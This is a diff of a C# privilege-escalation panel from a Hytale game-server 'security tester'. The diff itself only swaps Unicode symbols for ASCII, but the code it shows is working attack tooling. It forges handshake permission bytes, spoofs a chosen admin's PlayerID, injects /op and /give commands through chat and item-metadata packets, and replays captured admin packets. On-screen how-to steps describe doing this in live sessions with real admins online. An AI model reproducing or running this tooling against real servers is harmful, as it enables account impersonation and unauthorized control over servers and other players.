@@ -7,15 +7,15 @@ using System.Net.Sockets;
 namespace HytaleSecurityTester.Tabs;
 
 /// <summary>
-/// Privilege Escalation — advanced permission validation test suite.
+/// Privilege Escalation - advanced permission validation test suite.
 ///
 /// Sub-tabs:
-///   Give Item        — send a give-item packet as a non-OP player
-///   Handshake Tamper — forge the PermissionLevel byte in the login/handshake packet
-///   Session Spoofer  — wrap outgoing packets with a target admin's PlayerID header
-///   Command Inject   — send raw OP commands or embed them in chat/item packets
-///   Metadata Inject  — append hidden command strings into item metadata/lore fields
-///   Perm Spoof       — prepend an arbitrary permission-level byte to any packet
+///   Give Item        - send a give-item packet as a non-OP player
+///   Handshake Tamper - forge the PermissionLevel byte in the login/handshake packet
+///   Session Spoofer  - wrap outgoing packets with a target admin's PlayerID header
+///   Command Inject   - send raw OP commands or embed them in chat/item packets
+///   Metadata Inject  - append hidden command strings into item metadata/lore fields
+///   Perm Spoof       - prepend an arbitrary permission-level byte to any packet
 ///
 /// Admin Candidates panel (right sidebar):
 ///   Scanned automatically from recent packets using ContextFiller +
@@ -87,7 +87,7 @@ public class PrivilegeTab : ITab
     private int    _arReplayDelay  = 50;
 
     // ── Handshake Tamper ──────────────────────────────────────────────────
-    private int    _hsPermLevel   = 4;       // 0=guest … 4=owner
+    private int    _hsPermLevel   = 4;       // 0=guest ... 4=owner
     private int    _hsPlayerIdInPkt = 1;
     private string _hsUsername    = "admin";
     private int    _hsVersion     = 1;
@@ -171,7 +171,7 @@ public class PrivilegeTab : ITab
         RenderAutoFillBar(fullW);
         ImGui.Spacing();
 
-        // ── Sub-tab bar — scrollable, handles overflow automatically ─────
+        // ── Sub-tab bar - scrollable, handles overflow automatically ─────
         if (ImGui.BeginTabBar("##priv_subtabs", ImGuiTabBarFlags.FittingPolicyScroll))
         {
             for (int i = 0; i < SubTabs.Length; i++)
@@ -249,7 +249,7 @@ public class PrivilegeTab : ITab
             ImGui.PopStyleColor();
             ImGui.SetCursorPos(new Vector2(6, 4));
             ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColWarn);
-            ImGui.TextUnformatted($"★ Target: {_targetPlayerId}");
+            ImGui.TextUnformatted($"[*] Target: {_targetPlayerId}");
             ImGui.PopStyleColor();
             if (_targetPlayerName.Length > 0)
             {
@@ -270,7 +270,7 @@ public class PrivilegeTab : ITab
 
         // Column header
         ImGui.SetCursorPosX(8);
-        UiHelper.MutedLabel($"  {"ID",-8} {"×",-5} {"Name",-10}");
+        UiHelper.MutedLabel($"  {"ID",-8} {"x",-5} {"Name",-10}");
         ImGui.Spacing();
 
         if (_adminList.Count == 0)
@@ -300,7 +300,7 @@ public class PrivilegeTab : ITab
             ImGui.PushStyleColor(ImGuiCol.Text,
                 sel ? MenuRenderer.ColWarn : MenuRenderer.ColBlue);
             if (ImGui.Selectable(
-                $"  {c.PlayerId,-8} ×{c.Seen,-4} {(c.Name ?? "?"),-10}##adm{i}",
+                $"  {c.PlayerId,-8}x{c.Seen,-4} {(c.Name ?? "?"),-10}##adm{i}",
                 sel, ImGuiSelectableFlags.None, new Vector2(w - 12, 20)))
             {
                 _selectedAdmin      = i;
@@ -311,9 +311,9 @@ public class PrivilegeTab : ITab
                 _ssAdminId    = c.PlayerId;
                 _psWrappedId  = c.PlayerId;
                 _hsPlayerIdInPkt = c.PlayerId;
-                _log.Success($"[PrivEsc] Target locked → ID {c.PlayerId}" +
+                _log.Success($"[PrivEsc] Target locked -> ID {c.PlayerId}" +
                              (c.Name != null ? $" ({c.Name})" : "") +
-                             $" seen ×{c.Seen}");
+                             $" seenx{c.Seen}");
             }
             ImGui.PopStyleColor();
         }
@@ -340,7 +340,7 @@ public class PrivilegeTab : ITab
                 ImGui.SameLine();
                 ImGui.PushStyleColor(ImGuiCol.Button, MenuRenderer.ColBg3);
                 ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColTextMuted);
-                if (ImGui.Button($"→##bk{saved.Label.GetHashCode()}", new Vector2(22, 16)))
+                if (ImGui.Button($"->##bk{saved.Label.GetHashCode()}", new Vector2(22, 16)))
                 {
                     // Load into the relevant sub-tab hex field
                     switch (_subTab)
@@ -387,7 +387,7 @@ public class PrivilegeTab : ITab
             ImGui.InputInt("Target Player ID##gpid", ref _giPlayerId);
             ImGui.SameLine(0, 8);
             UiHelper.MutedLabel(_targetPlayerId > 0
-                ? $"← or use admin target ({_targetPlayerId})" : "← or select from sidebar");
+                ? $"<- or use admin target ({_targetPlayerId})" : "<- or select from sidebar");
 
             ImGui.Spacing();
 
@@ -398,12 +398,12 @@ public class PrivilegeTab : ITab
                 pkt.AddRange(BitConverter.GetBytes(_giCount));
                 pkt.AddRange(BitConverter.GetBytes(_giPlayerId));
                 SendRaw(pkt.ToArray());
-                _log.Info($"[PrivEsc] Give item — ItemID={_giItemId} ×{_giCount}" +
-                          $" → PlayerID={_giPlayerId}");
+                _log.Info($"[PrivEsc] Give item - ItemID={_giItemId}x{_giCount}" +
+                          $" -> PlayerID={_giPlayerId}");
             });
 
             ImGui.Spacing();
-            UiHelper.MutedLabel("Item appears → server trusts client  |  Kick/error → permission checked.");
+            UiHelper.MutedLabel("Item appears -> server trusts client  |  Kick/error -> permission checked.");
         });
     }
 
@@ -413,7 +413,7 @@ public class PrivilegeTab : ITab
 
     private void RenderHandshakeTamper(float w)
     {
-        UiHelper.SectionBox("HANDSHAKE TAMPER — PERMISSION LEVEL INJECTION", w, 310, () =>
+        UiHelper.SectionBox("HANDSHAKE TAMPER - PERMISSION LEVEL INJECTION", w, 310, () =>
         {
             UiHelper.MutedLabel("Forges the PermissionLevel field in the initial connection packet (0x10).");
             UiHelper.MutedLabel("A vulnerable server uses this value to grant admin rights at login.");
@@ -446,7 +446,7 @@ public class PrivilegeTab : ITab
                 UiHelper.WarnButton("Send Mutated Handshake##hsmutsend", 240, 32, () =>
                 {
                     if (string.IsNullOrWhiteSpace(_hsCapturedHex))
-                    { _log.Error("[Handshake] No captured packet — paste hex or load from Book."); return; }
+                    { _log.Error("[Handshake] No captured packet - paste hex or load from Book."); return; }
                     try
                     {
                         byte[] raw = HexToBytes(_hsCapturedHex);
@@ -454,7 +454,7 @@ public class PrivilegeTab : ITab
                         { _log.Error($"[Handshake] Offset {_hsPermByteOff} out of range ({raw.Length}b)."); return; }
                         raw[_hsPermByteOff] = (byte)_hsPermLevel;
                         SendRaw(raw);
-                        _hsSendLog = $"Sent {raw.Length}b — perm byte @ offset {_hsPermByteOff} " +
+                        _hsSendLog = $"Sent {raw.Length}b - perm byte @ offset {_hsPermByteOff} " +
                                      $"set to 0x{_hsPermLevel:X2} ({PermName(_hsPermLevel)})";
                         _log.Success($"[Handshake] {_hsSendLog}");
                     }
@@ -501,7 +501,7 @@ public class PrivilegeTab : ITab
                 {
                     byte[] pkt = BuildHandshakePacket();
                     SendRaw(pkt);
-                    _hsSendLog = $"Sent {pkt.Length}b — user='{_hsUsername}' " +
+                    _hsSendLog = $"Sent {pkt.Length}b - user='{_hsUsername}' " +
                                  $"perm=0x{_hsPermLevel:X2} ({PermName(_hsPermLevel)}) " +
                                  $"playerID={_hsPlayerIdInPkt}";
                     _log.Info($"[Handshake] {_hsSendLog}");
@@ -519,9 +519,9 @@ public class PrivilegeTab : ITab
             ImGui.Spacing();
             RenderHowTo(
                 "1. Start the Capture proxy BEFORE launching the game client",
-                "2. Join the server — the handshake is the first C→S packet",
-                "3. Copy the hex from Packet Log (0x10 packet) → paste above",
-                "4. Set the permission byte offset (usually bytes 5–9)",
+                "2. Join the server - the handshake is the first C->S packet",
+                "3. Copy the hex from Packet Log (0x10 packet) -> paste above",
+                "4. Set the permission byte offset (usually bytes 5-9)",
                 "5. Set perm level to 3 or 4, send, watch for elevated rights",
                 "6. Server grants admin = perm level not re-validated server-side");
         });
@@ -566,7 +566,7 @@ public class PrivilegeTab : ITab
             if (_targetPlayerId > 0)
             {
                 ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColWarn);
-                ImGui.TextUnformatted($"★ Sidebar: {_targetPlayerId}");
+                ImGui.TextUnformatted($"[*] Sidebar: {_targetPlayerId}");
                 ImGui.PopStyleColor();
                 ImGui.SameLine(0, 6);
                 UiHelper.SecondaryButton("Use##ssuse", 40, 22,
@@ -621,18 +621,18 @@ public class PrivilegeTab : ITab
                     int delay = _ssDelayMs;
                     int count = _ssSendCount;
                     _log.Info($"[SessionSpoof] Wrapping {payload.Length}b payload with AdminID={_ssAdminId}" +
-                              $" × {count} (delay {delay}ms)");
+                              $"x {count} (delay {delay}ms)");
                     Task.Run(async () =>
                     {
                         for (int i = 0; i < count; i++)
                         {
                             byte[] wrapped = WrapWithPlayerId(_ssAdminId, payload, _ssWrapAllFields);
                             SendRaw(wrapped);
-                            _log.Info($"[SessionSpoof] #{i+1}: {wrapped.Length}b sent — " +
+                            _log.Info($"[SessionSpoof] #{i+1}: {wrapped.Length}b sent - " +
                                       $"hex prefix: {BytesToHex(wrapped, 8)}...");
                             if (delay > 0) await Task.Delay(delay);
                         }
-                        _log.Success($"[SessionSpoof] Done — {count} wrapped packet(s) sent.");
+                        _log.Success($"[SessionSpoof] Done - {count} wrapped packet(s) sent.");
                     });
                 }
                 catch (Exception ex) { _log.Error($"[SessionSpoof] {ex.Message}"); }
@@ -640,9 +640,9 @@ public class PrivilegeTab : ITab
 
             ImGui.Spacing();
             RenderHowTo(
-                "1. Identify an admin's PlayerID — watch for high-privilege actions in the Packet Log",
+                "1. Identify an admin's PlayerID - watch for high-privilege actions in the Packet Log",
                 "2. Select their ID from the sidebar (auto-scanned) or enter manually",
-                "3. Paste any C→S packet hex you want to execute as that admin",
+                "3. Paste any C->S packet hex you want to execute as that admin",
                 "4. 'Wrap all ID fields' replaces every matching 4-byte sender ID in the payload",
                 "5. Server accepts action = session ID not validated  |  Reject = secure binding");
         });
@@ -719,7 +719,7 @@ public class PrivilegeTab : ITab
     {
         UiHelper.SectionBox("RAW COMMAND INJECTION", w, 260, () =>
         {
-            UiHelper.MutedLabel("Sends a C→S chat/command packet (0x01) directly.");
+            UiHelper.MutedLabel("Sends a C->S chat/command packet (0x01) directly.");
             UiHelper.MutedLabel("Tests if the server checks OP permission before executing server commands.");
             ImGui.Spacing();
 
@@ -746,7 +746,7 @@ public class PrivilegeTab : ITab
 
             ImGui.SetNextItemWidth(-1);
             ImGui.InputText("Command##cicmd", ref _ciCommand, 256);
-            UiHelper.MutedLabel("Use {target} — it is replaced with the selected admin's name/ID.");
+            UiHelper.MutedLabel("Use {target} - it is replaced with the selected admin's name/ID.");
 
             ImGui.Spacing();
             ImGui.Checkbox("Null-byte delimiter before command##cind", ref _ciNullDelimit);
@@ -758,7 +758,7 @@ public class PrivilegeTab : ITab
             UiHelper.WarnButton("Send Command(s)##cirawsend", 200, 32, () =>
             {
                 string cmd = ResolveTarget(_ciCommand);
-                _log.Info($"[CmdInject/Raw] Sending {_ciRepeat}×: {cmd.Replace("\0","\\0")}");
+                _log.Info($"[CmdInject/Raw] Sending {_ciRepeat}x: {cmd.Replace("\0","\\0")}");
                 Task.Run(() =>
                 {
                     for (int n = 0; n < _ciRepeat; n++)
@@ -772,7 +772,7 @@ public class PrivilegeTab : ITab
 
             ImGui.Spacing();
             UiHelper.MutedLabel("Executes = server trusts client command perms");
-            UiHelper.MutedLabel("No effect / kick = server validates OP level ✓");
+            UiHelper.MutedLabel("No effect / kick = server validates OP level [OK]");
         });
     }
 
@@ -781,7 +781,7 @@ public class PrivilegeTab : ITab
         UiHelper.SectionBox("CHAT PACKET COMMAND APPEND", w, 290, () =>
         {
             UiHelper.MutedLabel("Takes a captured chat packet and appends a hidden command string.");
-            UiHelper.MutedLabel("Some parsers split on \\0 or \\n — the appended payload may be executed separately.");
+            UiHelper.MutedLabel("Some parsers split on \\0 or \\n - the appended payload may be executed separately.");
             ImGui.Spacing();
 
             UiHelper.MutedLabel("Base chat packet hex:");
@@ -826,7 +826,7 @@ public class PrivilegeTab : ITab
                     byte[] pkt = BuildChatAppendPacket(
                         HexToBytes(_ciChatHex), ResolveTarget(_ciCommand), _ciNullDelimit);
                     SendRaw(pkt);
-                    _log.Info($"[CmdInject/Chat] {pkt.Length}b sent — inject: '{ResolveTarget(_ciCommand)}'");
+                    _log.Info($"[CmdInject/Chat] {pkt.Length}b sent - inject: '{ResolveTarget(_ciCommand)}'");
                 }
                 catch (Exception ex) { _log.Error($"[CmdInject/Chat] {ex.Message}"); }
             });
@@ -836,7 +836,7 @@ public class PrivilegeTab : ITab
                 "1. Capture a normal chat message packet in Capture tab",
                 "2. Paste its hex above (or load from Packet Book)",
                 "3. Set inject string to /op or /gamemode creative",
-                "4. Send — if the server splits on \\0 or \\n it may execute both");
+                "4. Send - if the server splits on \\0 or \\n it may execute both");
         });
     }
 
@@ -866,7 +866,7 @@ public class PrivilegeTab : ITab
                     byte[] pkt = BuildItemEmbedPacket(
                         HexToBytes(_ciItemHex), ResolveTarget(_ciCommand), _ciNullDelimit);
                     SendRaw(pkt);
-                    _log.Info($"[CmdInject/Item] {pkt.Length}b sent — embedded: '{ResolveTarget(_ciCommand)}'");
+                    _log.Info($"[CmdInject/Item] {pkt.Length}b sent - embedded: '{ResolveTarget(_ciCommand)}'");
                 }
                 catch (Exception ex) { _log.Error($"[CmdInject/Item] {ex.Message}"); }
             });
@@ -882,7 +882,7 @@ public class PrivilegeTab : ITab
         UiHelper.SectionBox("ITEM METADATA INJECTION", w, 370, () =>
         {
             UiHelper.MutedLabel("Locates the string region in an item packet and appends a hidden payload.");
-            UiHelper.MutedLabel("Targets: item name, lore, enchant description — any UTF-8 string in the packet.");
+            UiHelper.MutedLabel("Targets: item name, lore, enchant description - any UTF-8 string in the packet.");
             ImGui.Spacing();
 
             UiHelper.MutedLabel("Base item packet (hex):");
@@ -949,7 +949,7 @@ public class PrivilegeTab : ITab
                     byte[] mutated = MutateItemMetadata(b, ResolveTarget(_miInjectStr),
                                                         _miAppend, _miNullTerm, _miSearchOffset);
                     SendRaw(mutated);
-                    _log.Success($"[MetaInject] {mutated.Length}b sent — inject: '{ResolveTarget(_miInjectStr)}'");
+                    _log.Success($"[MetaInject] {mutated.Length}b sent - inject: '{ResolveTarget(_miInjectStr)}'");
                 }
                 catch (Exception ex) { _log.Error($"[MetaInject] {ex.Message}"); }
             });
@@ -1000,7 +1000,7 @@ public class PrivilegeTab : ITab
 
         if (strStart < 0)
         {
-            // No string found — just append at end
+            // No string found - just append at end
             copy.AddRange(payload);
         }
         else if (append)
@@ -1091,7 +1091,7 @@ public class PrivilegeTab : ITab
                     byte[] raw  = HexToBytes(_psHex);
                     byte[] pkt  = BuildSpoofedPermPacket(raw);
                     SendRaw(pkt);
-                    _log.Success($"[PermSpoof] {pkt.Length}b sent — prefix: {BytesToHex(pkt, 8)}...");
+                    _log.Success($"[PermSpoof] {pkt.Length}b sent - prefix: {BytesToHex(pkt, 8)}...");
                 }
                 catch (Exception ex) { _log.Error($"[PermSpoof] {ex.Message}"); }
             });
@@ -1102,7 +1102,7 @@ public class PrivilegeTab : ITab
                 "2. Paste its hex above (or load from Packet Book)",
                 "3. Enable 'Prepend permission byte', set level to 3 or 4",
                 "4. Optionally also wrap with an admin PlayerID from the sidebar",
-                "5. Send — watch if the server grants elevated rights for this packet");
+                "5. Send - watch if the server grants elevated rights for this packet");
         });
     }
 
@@ -1132,7 +1132,7 @@ public class PrivilegeTab : ITab
             {
                 _tokens.Clear();
                 ScanTokensAndAdminActions(_capture.GetPackets());
-                _log.Info($"[Tokens] Scan complete — {_tokens.Count} token candidates found.");
+                _log.Info($"[Tokens] Scan complete - {_tokens.Count} token candidates found.");
             });
             ImGui.SameLine(0, 8);
             UiHelper.MutedLabel($"{_tokens.Count} candidates found");
@@ -1155,7 +1155,7 @@ public class PrivilegeTab : ITab
         if (_tokens.Count == 0)
         {
             ImGui.SetCursorPosX(12);
-            UiHelper.MutedLabel("No token candidates yet — capture traffic while logging in/joining.");
+            UiHelper.MutedLabel("No token candidates yet - capture traffic while logging in/joining.");
         }
 
         for (int ti = 0; ti < _tokens.Count; ti++)
@@ -1174,7 +1174,7 @@ public class PrivilegeTab : ITab
                 ? MenuRenderer.ColBlue : MenuRenderer.ColAccent;
 
             ImGui.PushStyleColor(ImGuiCol.Text, dirCol);
-            ImGui.TextUnformatted($"  {(t.Direction == PacketDirection.ClientToServer ? "C→S" : "S→C"),-5}");
+            ImGui.TextUnformatted($"  {(t.Direction == PacketDirection.ClientToServer ? "C->S" : "S->C"),-5}");
             ImGui.PopStyleColor();
             ImGui.SameLine(0, 4);
             UiHelper.MutedLabel($" 0x{t.Opcode:X2}   +{t.Offset,-6} {t.TokenBytes.Length,-5}");
@@ -1239,7 +1239,7 @@ public class PrivilegeTab : ITab
 
     private void RenderSpawnItems(float w)
     {
-        UiHelper.SectionBox("ADMIN ITEM SPAWN — MULTI-METHOD TESTER", w, 200, () =>
+        UiHelper.SectionBox("ADMIN ITEM SPAWN - MULTI-METHOD TESTER", w, 200, () =>
         {
             UiHelper.MutedLabel("Tests item spawning/giving through every available attack vector.");
             UiHelper.MutedLabel("Iterates raw packets, command variants, and admin-session wrapping.");
@@ -1324,7 +1324,7 @@ public class PrivilegeTab : ITab
             {
                 Task.Run(async () =>
                 {
-                    _log.Info("[SpawnChain] Starting full privilege escalation chain…");
+                    _log.Info("[SpawnChain] Starting full privilege escalation chain...");
 
                     // Step 1: Forge handshake
                     byte[] hsPacket = BuildHandshakePacket();
@@ -1343,7 +1343,7 @@ public class PrivilegeTab : ITab
                     itemPkt.AddRange(BitConverter.GetBytes(adminId));
                     byte[] wrapped = WrapWithPlayerId(adminId, itemPkt.ToArray(), true);
                     SendRaw(wrapped);
-                    _log.Info($"[SpawnChain] Step 3: Wrapped give-item sent (ItemID={_spawnItemId} ×{_spawnCount} → PlayerID={adminId}).");
+                    _log.Info($"[SpawnChain] Step 3: Wrapped give-item sent (ItemID={_spawnItemId}x{_spawnCount} -> PlayerID={adminId}).");
                     await Task.Delay(200);
 
                     // Step 4: Command variant
@@ -1352,7 +1352,7 @@ public class PrivilegeTab : ITab
                     SendRaw(BuildChatPacket(cmd, false));
                     _log.Success($"[SpawnChain] Chain complete. Check inventory and server response.");
                     AlertBus.Push(AlertBus.Sec_Privilege, AlertLevel.Critical,
-                        $"Escalation chain fired: item {_spawnItemId} ×{_spawnCount}");
+                        $"Escalation chain fired: item {_spawnItemId}x{_spawnCount}");
                 });
             });
 
@@ -1364,7 +1364,7 @@ public class PrivilegeTab : ITab
         RenderHowTo(
             "1. Auto-fill item ID from Item Inspector (⟳ button) or enter manually",
             "2. Set target Player ID (yourself = 0, admin target = use sidebar)",
-            "3. Try 'Try ALL Methods' — this fires every known spawn technique",
+            "3. Try 'Try ALL Methods' - this fires every known spawn technique",
             "4. ANY method that puts the item in inventory = server-side vulnerability",
             "5. Use 'Run Full Chain' to combine handshake tamper + session spoof + spawn",
             "6. Document successful vectors in Protocol Map for future reference");
@@ -1396,7 +1396,7 @@ public class PrivilegeTab : ITab
                         raw.AddRange(BitConverter.GetBytes(_spawnCount));
                         raw.AddRange(BitConverter.GetBytes(targetId));
                         pkt  = raw.ToArray();
-                        desc = $"0x2A packet (item={_spawnItemId} ×{_spawnCount} → {targetId})";
+                        desc = $"0x2A packet (item={_spawnItemId}x{_spawnCount} -> {targetId})";
                         break;
                     case 1: // /give
                         pkt  = BuildChatPacket($"/give {targetName} {_spawnItemId} {_spawnCount}", false);
@@ -1435,7 +1435,7 @@ public class PrivilegeTab : ITab
                 if (delay > 0 && r < repeatN - 1)
                     await Task.Delay(delay);
             }
-            _log.Success($"[SpawnItems] Done — method '{SpawnMethods[method]}' × {repeatN}");
+            _log.Success($"[SpawnItems] Done - method '{SpawnMethods[method]}'x {repeatN}");
         });
     }
 
@@ -1507,20 +1507,20 @@ public class PrivilegeTab : ITab
                 ? MenuRenderer.ColBlue : MenuRenderer.ColAccent;
 
             ImGui.PushStyleColor(ImGuiCol.Text, dirCol);
-            ImGui.TextUnformatted($"  [{ai+1,-2}] {(action.Direction == PacketDirection.ClientToServer ? "C→S" : "S→C"),-5}");
+            ImGui.TextUnformatted($"  [{ai+1,-2}] {(action.Direction == PacketDirection.ClientToServer ? "C->S" : "S->C"),-5}");
             ImGui.PopStyleColor();
             ImGui.SameLine(0, 4);
             UiHelper.MutedLabel($"0x{action.Opcode:X2}   {action.Data.Length,-6} {action.At:HH:mm:ss,-10} {action.Reason}");
 
             // Replay inline
             ImGui.SameLine(w - 75);
-            UiHelper.WarnButton($"▶##arrep{ai}", 30, 18, () =>
+            UiHelper.WarnButton($">##arrep{ai}", 30, 18, () =>
             {
                 _arSelectedIdx = ai;
                 DoReplay(action);
             });
             ImGui.SameLine(0, 2);
-            UiHelper.SecondaryButton($"→HS##ar2hs{ai}", 40, 18, () =>
+            UiHelper.SecondaryButton($"->HS##ar2hs{ai}", 40, 18, () =>
             {
                 _hsCapturedHex  = BytesToHex(action.Data, action.Data.Length);
                 _hsReuseCapture = true;
@@ -1548,7 +1548,7 @@ public class PrivilegeTab : ITab
                 ImGui.SetNextItemWidth(80); ImGui.InputInt("Delay ms##arrd", ref _arReplayDelay);
                 _arReplayDelay = Math.Max(0, _arReplayDelay);
                 ImGui.SameLine(0, 12);
-                UiHelper.WarnButton($"Replay ×{_arReplayCount}##arrepN", 140, 28, () =>
+                UiHelper.WarnButton($"Replayx{_arReplayCount}##arrepN", 140, 28, () =>
                 {
                     int count = _arReplayCount, delay = _arReplayDelay;
                     var data  = action.Data;
@@ -1560,9 +1560,9 @@ public class PrivilegeTab : ITab
                             _log.Info($"[AdminReplay] #{r+1}/{count}: 0x{data[0]:X2} {data.Length}b");
                             if (delay > 0) await Task.Delay(delay);
                         }
-                        _log.Success($"[AdminReplay] Done × {count}.");
+                        _log.Success($"[AdminReplay] Donex {count}.");
                         AlertBus.Push(AlertBus.Sec_Privilege, AlertLevel.Warn,
-                            $"Admin action replayed ×{count}: 0x{data[0]:X2}");
+                            $"Admin action replayedx{count}: 0x{data[0]:X2}");
                     });
                 });
             });
@@ -1571,11 +1571,11 @@ public class PrivilegeTab : ITab
         ImGui.Spacing();
         RenderHowTo(
             "1. Start proxy in Capture tab",
-            "2. Have an admin online — watch them perform privileged actions",
+            "2. Have an admin online - watch them perform privileged actions",
             "3. Their action packets appear here, flagged by opcode / ID patterns",
-            "4. Select an action and click ▶ to replay it as your session",
+            "4. Select an action and click > to replay it as your session",
             "5. Server accepts = it validates sender-side only at login, not per-packet",
-            "6. Use '→HS' to load the packet into Handshake Tamper for deeper mutation");
+            "6. Use '->HS' to load the packet into Handshake Tamper for deeper mutation");
     }
 
     private void DoReplay(AdminActionEntry action)
@@ -1645,8 +1645,8 @@ public class PrivilegeTab : ITab
                 {
                     0x2A => "Give/spawn item packet",
                     0x01 => "Command packet (/ prefix)",
-                    0x50 or 0x51 or 0x52 => "Admin opcode range (0x50–0x52)",
-                    0x60 or 0x61 => "Admin opcode range (0x60–0x61)",
+                    0x50 or 0x51 or 0x52 => "Admin opcode range (0x50-0x52)",
+                    0x60 or 0x61 => "Admin opcode range (0x60-0x61)",
                     0x70 => "Admin opcode 0x70",
                     _ => $"Flagged opcode 0x{op:X2}",
                 };
@@ -1698,20 +1698,20 @@ public class PrivilegeTab : ITab
         ImGui.SetCursorPos(new Vector2(12, 6));
         ImGui.PushStyleColor(ImGuiCol.Text, srv ? MenuRenderer.ColAccent : MenuRenderer.ColDanger);
         ImGui.TextUnformatted(srv
-            ? $"● {_config.ServerIp}:{_config.ServerPort}"
-            : "● No server — set in Dashboard");
+            ? $"[>] {_config.ServerIp}:{_config.ServerPort}"
+            : "[>] No server - set in Dashboard");
         ImGui.PopStyleColor();
         ImGui.SameLine(0, 24);
         ImGui.PushStyleColor(ImGuiCol.Text, ses ? MenuRenderer.ColAccent : MenuRenderer.ColWarn);
         ImGui.TextUnformatted(ses
-            ? "● Proxy active — injecting into live session"
-            : "● No proxy — start Capture tab first");
+            ? "[>] Proxy active - injecting into live session"
+            : "[>] No proxy - start Capture tab first");
         ImGui.PopStyleColor();
         if (_targetPlayerId > 0)
         {
             ImGui.SameLine(0, 24);
             ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColWarn);
-            ImGui.TextUnformatted($"★ Targeting: ID {_targetPlayerId}" +
+            ImGui.TextUnformatted($"[*] Targeting: ID {_targetPlayerId}" +
                 (_targetPlayerName.Length > 0 ? $" ({_targetPlayerName})" : ""));
             ImGui.PopStyleColor();
         }
@@ -1745,11 +1745,11 @@ public class PrivilegeTab : ITab
             }
             bool got = _lastFill.HasItem || _lastFill.HasPlayer;
             _fillStatus = got
-                ? $"Filled: Item={(_lastFill.HasItem ? _giItemId.ToString() : "–")}  " +
-                  $"PlayerID={(_targetPlayerId > 0 ? _targetPlayerId.ToString() : "–")}  " +
-                  $"Name={(_targetPlayerName.Length > 0 ? _targetPlayerName : "–")}"
-                : "Nothing found — capture traffic first, then retry.";
-            if (got) _log.Success($"[PrivEsc] Auto-filled — {_fillStatus}");
+                ? $"Filled: Item={(_lastFill.HasItem ? _giItemId.ToString() : "-")}  " +
+                  $"PlayerID={(_targetPlayerId > 0 ? _targetPlayerId.ToString() : "-")}  " +
+                  $"Name={(_targetPlayerName.Length > 0 ? _targetPlayerName : "-")}"
+                : "Nothing found - capture traffic first, then retry.";
+            if (got) _log.Success($"[PrivEsc] Auto-filled - {_fillStatus}");
             else     _log.Warn("[PrivEsc] Auto-fill: no IDs found in recent packets.");
         });
 
@@ -1870,7 +1870,7 @@ public class PrivilegeTab : ITab
         return s.Replace("{target}", t);
     }
 
-    /// Inline ⟳ auto-fill button (18×20) for beside input fields
+    /// Inline ⟳ auto-fill button (18x20) for beside input fields
     private void InlineAutoFill(string id, Action fill)
     {
         ImGui.PushStyleColor(ImGuiCol.Button, MenuRenderer.ColBg3);
@@ -1885,7 +1885,7 @@ public class PrivilegeTab : ITab
     {
         int take = Math.Min(maxBytes, b.Length);
         return string.Join(" ", b.Take(take).Select(x => $"{x:X2}"))
-               + (b.Length > maxBytes ? "…" : "");
+               + (b.Length > maxBytes ? "..." : "");
     }
 
     private static byte[] HexToBytes(string hex)
@@ -1919,7 +1919,7 @@ public class PrivilegeTab : ITab
     // ══════════════════════════════════════════════════════════════════════
     //
     // Probes a matrix of permission nodes by sending test commands and
-    // listening for the first server→client response packet after each one.
+    // listening for the first server->client response packet after each one.
     // Classifies each result as ALLOW / DENY / SILENCE / KICK and builds
     // a live authorization-boundary table for documentation.
 
@@ -2008,7 +2008,7 @@ public class PrivilegeTab : ITab
             ImGui.SameLine(0, 12);
             if (_crtCurrentProbe >= 0 && _crtCurrentProbe < _probes.Count)
             {
-                UiHelper.WarnText($"● Probing [{_crtCurrentProbe + 1}/{_probes.Count}]: " +
+                UiHelper.WarnText($"[>] Probing [{_crtCurrentProbe + 1}/{_probes.Count}]: " +
                                   _probes[_crtCurrentProbe].Node);
             }
         }
@@ -2083,7 +2083,7 @@ public class PrivilegeTab : ITab
             // Node + command (selectable, expands edit form)
             ImGui.PushStyleColor(ImGuiCol.Text, ResultColor(p.Result));
             if (ImGui.Selectable(
-                $"  {p.Node,-22} {p.Command[..Math.Min(30, p.Command.Length)].Replace("{target}", "…"),-32}" +
+                $"  {p.Node,-22} {p.Command[..Math.Min(30, p.Command.Length)].Replace("{target}", "..."),-32}" +
                 $" {ResultLabel(p.Result),-10} {p.RawResponse[..Math.Min(40, p.RawResponse.Length)]}##crtsel{i}",
                 _crtEditIdx == i, ImGuiSelectableFlags.None, new Vector2(w - 60, 22)))
                 _crtEditIdx = _crtEditIdx == i ? -1 : i;
@@ -2093,7 +2093,7 @@ public class PrivilegeTab : ITab
             ImGui.SameLine(w - 56);
             ImGui.PushStyleColor(ImGuiCol.Button, MenuRenderer.ColBg3);
             ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColTextMuted);
-            if (ImGui.Button($"▶##crtp{i}", new Vector2(24, 20)) && !_crtRunning)
+            if (ImGui.Button($">##crtp{i}", new Vector2(24, 20)) && !_crtRunning)
                 ProbeSingle(i);
             ImGui.PopStyleColor(2);
 
@@ -2141,7 +2141,7 @@ public class PrivilegeTab : ITab
                     p.DenyKeyword = _crtEditDenyBuf;
 
                 ImGui.SetCursorPosX(6);
-                UiHelper.MutedLabel("Use {target} — replaced with the admin name/ID from the sidebar.");
+                UiHelper.MutedLabel("Use {target} - replaced with the admin name/ID from the sidebar.");
                 if (p.RawResponse.Length > 0)
                 {
                     ImGui.SetCursorPosX(6);
@@ -2198,7 +2198,7 @@ public class PrivilegeTab : ITab
             .Where(t => t.p.Enabled || _crtIncludeDisabled)
             .ToList();
 
-        _log.Info($"[CmdTable] Starting {toRun.Count} probes — target='{target}'");
+        _log.Info($"[CmdTable] Starting {toRun.Count} probes - target='{target}'");
 
         Task.Run(async () =>
         {
@@ -2231,7 +2231,7 @@ public class PrivilegeTab : ITab
                     continue;
                 }
 
-                // Wait for listen window, then examine new S→C packets
+                // Wait for listen window, then examine new S->C packets
                 await Task.Delay(_crtListenMs);
 
                 var newPkts = _capture.GetPackets()
@@ -2276,13 +2276,13 @@ public class PrivilegeTab : ITab
                     }
                 }
 
-                _log.Info($"[CmdTable] '{probe.Node}' → {ResultLabel(probe.Result)}: {probe.RawResponse}");
+                _log.Info($"[CmdTable] '{probe.Node}' -> {ResultLabel(probe.Result)}: {probe.RawResponse}");
                 await Task.Delay(Math.Max(0, _crtProbeDelayMs - _crtListenMs));
             }
 
             _crtRunning      = false;
             _crtCurrentProbe = -1;
-            _crtSummary = $"Done — ALLOW:{allow}  DENY:{deny}  SILENCE:{silence}  KICK:{kick}";
